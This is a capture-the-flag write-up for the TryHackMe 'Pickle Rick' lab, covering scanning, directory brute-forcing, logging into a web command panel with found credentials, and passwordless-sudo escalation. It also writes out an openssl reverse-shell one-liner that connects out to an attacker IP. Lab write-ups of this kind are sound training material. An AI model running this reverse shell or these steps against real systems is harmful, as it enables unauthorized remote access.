---
title: "TryHackMe: Pickle Rick"
date: 2025-12-08
categories: [CTFs, TryHackMe, Easy]
tags: [TryHackMe, TryHackMe Easy]
---

Machine by [ar33zy](https://tryhackme.com/p/ar33zy)

[Tryhackme link](https://tryhackme.com/room/picklerick)

---

## Tools Used:<!-- omit in toc -->

- Kali Linux
- NMAP
- gobuster
- dirbuster
- ncat


---

### 1. Nmap Scan

We'll scan the IP to see what services are running, first, let's visit the website.

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_01.png)

<br>

### 2. Website 

After visiting the website, we can't see anything that gives out any clues or ingridient.

After visiting the source code we can see the following, a username, we may be able to use a dictionary attack on ssh:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_02.png)

After a little test with hydra, we can see that the server doesn't allow password access (only with public keys):

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_03.png)

<br>

### 3. gobuster & dirbuster

I've tried to use gobuster to list the available directories and some files on the webserver, i could find a assets folder with a bunch of pics, i ran binwalk on all of them but none resulted in any clues.
 
![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_04.png)

The `robots.txt` file has a wierd text, i'll save it for later maybe: 

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_05.png)

After no successful clues i turned to dirbuster to look for php files, and found a `login.php`:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_06.png)

<br>

### 4. Web login

We can see a login portal, for wich i'll use the user `R1ckRul3s` and password `Wubbalubbadubdub` that we found previously:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_07.png)

And after logging in we can see the next command prompt, we are executing commands as `www-data` so we'll have limited access (all the other links on the navbar seem to lead to a dead end for the moment, so i'll ignore them):

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_08.png)

<br>

### 5. Reverse Shell access

Then i'll attempt to use a reverse shell that exploits openSSL from [this](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#openssl) website.
   
`mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.8.32.220:4242 > /tmp/s; rm /tmp/s`

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_09.png)

As we can see we've got access to the machine:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_10.png)

<br>

### 6. First Flag

We can see that there is a .txt file, if we cat that we can see the first flag:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_11.png)

<br>

### 7. Second Flag

After entering the `/home/` folder we see a couple of user's homes, ubuntu doesn't contain any visible file, but rick does, and there we can find the second flag:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_12.png)

<br>

### 8. Third Flag

Since we have a reverse shell access, let's try `sudo -l` to see if we have permissions on something:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_13.png)

As we can see, we've got permissions on all commands without password.

So let's use sudo to see the contents of user root home folder, and we can see the third flag:

![](/assets/img/ctf/tryhackme/easy/picklerick/picklerick_14.png)